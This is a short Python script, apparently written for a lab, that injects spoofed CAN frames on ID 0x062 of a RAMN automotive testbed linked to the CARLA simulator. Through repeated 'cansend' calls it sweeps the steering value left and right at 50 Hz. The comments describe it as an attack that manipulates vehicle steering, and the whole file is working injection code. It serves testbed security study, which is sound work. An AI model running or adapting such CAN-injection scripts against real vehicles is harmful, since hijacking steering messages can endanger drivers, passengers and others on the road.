#### Created by: Colton Smith
#### 31 October 2025: Version 1
#### USE: prints commands to command line to be executed while RAMN system is connected with CARLA running.
####      The commands sweep the steering value from left to right and the output is shown on the RAMN LCD
####      and on CARLA's steering value. IF you are not using CARLA, this will still work.
####

import subprocess, time

interface = "can0" # name determined on setup
can_id = "062"     # 062 is the ID for the steering value input.

# First 4 bytes can stay fixed (you can copy from a logged frame), they are possibly arbitrary, 
# but I am unsure so I copied from a frame before initiating the attack
tail = "240CE96E4F00"
print("Manipulating Vehicle Steering")

def send_frame(val):
    # val: 0x0044 (left) → 0x0FFF (right), first 4 bytes are percentages in hex between 0 and 100%
    data = f"{val:04X}{tail}"   # combine first 4 steering bytes with tail, and format
    cmd = f"cansend {interface} {can_id}#{data}" # create command cansend can0 062#0x**
    subprocess.run(cmd, shell=True)              # using subprocess, we can send commands to the command line

# Sweep left to right and back
while True: # RUNS UNTIL KEYBOARD INTERRUPT
    for val in range(0x0044, 0x0FFF, 0x010): # from 0 to 100 increment
        send_frame(val)                      # send frame function call
        time.sleep(0.02)                     # wait 0.02 seconds for 50 hz clock
    for val in range(0x0FFF, 0x0044, -0x010): # from 100 to 0 decrement
        send_frame(val)                       # send frame function call
        time.sleep(0.02)                      # wait 0.02 seconds for 50 hz clock
